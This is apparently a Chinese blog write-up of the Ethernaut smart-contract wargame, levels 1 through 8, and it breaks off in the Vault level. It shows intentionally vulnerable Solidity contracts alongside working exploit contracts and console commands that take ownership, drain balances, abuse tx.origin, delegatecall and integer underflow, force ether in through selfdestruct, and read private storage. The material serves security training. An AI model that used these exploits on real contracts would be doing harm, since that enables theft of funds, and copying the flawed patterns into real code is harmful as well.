    <link href="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ethernaut.zeppelin.solutions/">平台地址</a></p><h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h2><h3 id="闯关要求"><a href="#闯关要求" class="headerlink" title="闯关要求"></a>闯关要求</h3><ul><li>成为合约的owner</li><li>将余额减少为0</li></ul><h3 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallback &#123;<br><br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public contributions;<br>  address payable public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    owner.transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h3><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>首先点击”Get new instance”来获取一个实例</p></li><li><p>查看合约地址的资产总量</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>向合约转1wei，使贡献值大于0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.contribute(&#123;value:<span class="hljs-number">1</span>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>再次获取balance，检查是否成功改变</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>通过调用sendTransaction函数来触发fallback函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">await contract.send<span class="hljs-constructor">Transaction(&#123;<span class="hljs-params">value</span>:1&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>等交易完成后再次查看合约的owner，发现成功变为我们自己的地址</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.owner()<br></code></pre></td></tr></table></figure></li><li><p>调用withdraw来转走合约的所有代币</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.withdraw()<br></code></pre></td></tr></table></figure></li><li><p>点击”submit instance”即可完成闯关</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128141052114.png" alt="image-20220128141052114"></p></li></ol><h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h2><h3 id="闯关要求-1"><a href="#闯关要求-1" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>获得合约所有权</p><h3 id="合约代码-1"><a href="#合约代码-1" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  // constructor <br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-1"><a href="#合约分析-1" class="headerlink" title="合约分析"></a>合约分析</h3><p>构造函数名称与合约名称不一致，同时在构造函数中指定了函数调用者直接为合约的owner</p><h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>点击“Get new instance”来获取示例</p></li><li><p>调用构造函数来更换owner</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.Fal<span class="hljs-number">1</span>out()<br></code></pre></td></tr></table></figure></li><li><p>点击“submit instance”来提交答案</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128155228067.png" alt="image-20220128155228067"></p></li></ol><h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h2><h3 id="闯关要求-2"><a href="#闯关要求-2" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p><h3 id="合约代码-2"><a href="#合约代码-2" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract CoinFlip &#123;<br><br>  using SafeMath for uint256;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number.sub(1)));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-2"><a href="#合约分析-2" class="headerlink" title="合约分析"></a>合约分析</h3><p><a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">随机数问题</a></p><p>这题就是用了<code>block.blockhash(block.number-1)</code>，这个表示上一块的hash，然后去除以<code>2^255</code></p><h3 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract CoinFlip &#123;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number-1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue/FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0x50F027e7e09791A2DbC86E38AbdC1f8FE41d7A9B; //此处是实例地址<br>    CoinFlip expFlip = CoinFlip(con_addr);<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>    function guess() public &#123;<br>        uint256 blockValue = uint256(block.blockhash(block.number-1));<br>        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);<br>        bool guess = coinFlip == 1 ? true : false;<br>        expFlip.flip(guess);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在remix中部署合约，并点击guess十次</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209220508976.png" alt="image-20220209220508976"></p><p>期间可使用 <code>await contract.consecutiveWins()</code> 来查询成功次数</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209221813609.png" alt="image-20220209221813609"></p><h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h2><h3 id="闯关要求-3"><a href="#闯关要求-3" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>获取合约的owner权限</p><h3 id="合约代码-3"><a href="#合约代码-3" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-3"><a href="#合约分析-3" class="headerlink" title="合约分析"></a>合约分析</h3><p>这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户</p><h3 id="攻击流程-3"><a href="#攻击流程-3" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    Telephone target = Telephone(0x2b5e81876E14b3E0E1337F6BA7bc4A2d8844c904);//实例地址<br><br>    function attack() public &#123;<br>        target.changeOwner(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624);//自己的地址<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可使用<code>await contract.owner()</code>来查询合约的owner</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220216172446013.png" alt="image-20220216172446013"></p><h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h2><h3 id="闯关要求-4"><a href="#闯关要求-4" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是攻破下面这个基础 token 合约</p><p>你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好  </p><h3 id="合约代码-4"><a href="#合约代码-4" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-4"><a href="#合约分析-4" class="headerlink" title="合约分析"></a>合约分析</h3><p>整数溢出</p><p>这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于等于0</p><h3 id="攻击流程-4"><a href="#攻击流程-4" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0xf36B064eB8f9120392C6b352210566D6D8340700;<br>    address public trans_to = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;<br>    Token token = Token(con_addr);<br>    uint overvalue = 21;<br><br>    function attack() public &#123;<br>        token.transfer(trans_to,overvalue);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221164154258.png" alt="image-20220221164154258"></p><h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h2><h3 id="闯关要求-5"><a href="#闯关要求-5" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是申明你对你创建实例的所有权.</p><h3 id="合约代码-5"><a href="#合约代码-5" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) public &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) public &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-5"><a href="#合约分析-5" class="headerlink" title="合约分析"></a>合约分析</h3><ul><li><p><code>Solidity</code> 支持两种底层调用方式 <strong>call</strong> 和 <strong>delegatecall</strong></p><p><strong>call</strong> 外部调用时，上下文是外部合约</p><p><strong>delegatecall</strong> 外部调用时，上下文是调用合约</p><p><strong>call</strong> 与 <strong>delegatecall</strong> 的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。</p><p>函数的设计目的是为了使用存储在另一个合约的库代码。</p><p>二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行。</p><p>所以 <code>delegate.delegatecall(msg.data)</code> 其实调用的是 <code>delegate</code> 自身的 <code>msg.data</code></p></li><li><p><code>data</code> 头<code>4</code>个 <code>byte</code> 是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , <code>remix</code> 里调用函数，实际是向合约账户地址发送了( <code>msg.data[0:4]</code> == 函数签名哈希 )的一笔交易</p><p>所以我们只需调用 <code>Delegation</code> 的 <code>fallback</code> 的同时在 <code>msg.data</code> 放入 <code>pwn</code> 函数的签名即可</p></li><li><p><code>fallback</code> 的触发条件：</p><ul><li>一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 <code>fallback</code> 函数</li><li>二是只要是合约收到别人发送的 <code>Ether</code> 且没有数据，就会尝试执行 <code>fallback</code> 函数，此时 <code>fallback</code> 需要带有 <code>payable</code> 标记，否则，合约就会拒绝这个 <code>Ether</code></li></ul></li></ul><p>所以，通过转账触发 <code>Delegation</code> 合约的 <code>fallback</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符。</p><h3 id="攻击流程-5"><a href="#攻击流程-5" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//sha3的返回值前两个为0x，所以要切0-10个字符。</span><br>contract.sendTransaction(&#123;<span class="hljs-attr">data</span>: web3.utils.sha3(<span class="hljs-string">&quot;pwn()&quot;</span>).slice(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)&#125;);<br></code></pre></td></tr></table></figure><p>可能会out of gas，提高gas上限即可</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220227152252411.png" alt="image-20220227152252411"></p><h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h2><h3 id="闯关要求-6"><a href="#闯关要求-6" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>使合约的余额大于0</p><h3 id="合约代码-6"><a href="#合约代码-6" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-6"><a href="#合约分析-6" class="headerlink" title="合约分析"></a>合约分析</h3><p>在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点。</p><h3 id="攻击流程-6"><a href="#攻击流程-6" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.20;<br><br>contract Force &#123;<br>    function Force() public payable &#123;&#125;<br>    function attack(address _target) public &#123;<br>        selfdestruct(_target);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以用<code>getBalance(instance)</code>来查询实例余额</p><p>记得部署合约的时候存一点钱进去</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221221632944.png" alt="image-20220221221632944"></p><h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h2><h3 id="闯关要求-7"><a href="#闯关要求-7" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>打开 vault 来通过这一关!</p><h3 id="合约代码-7"><a href="#合约代码-7" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) public &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-7"><a href="#合约分析-7" class="headerlink" title="合约分析"></a>合约分析</h3><p>使用<code>web3.eth.getStorageAt()</code>方法返回一个以太坊地址的指定位置存储内容，借此获得密码内容</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223155339055.png" alt="image-20220223155339055"></p><h3 id="攻击流程-7"><a 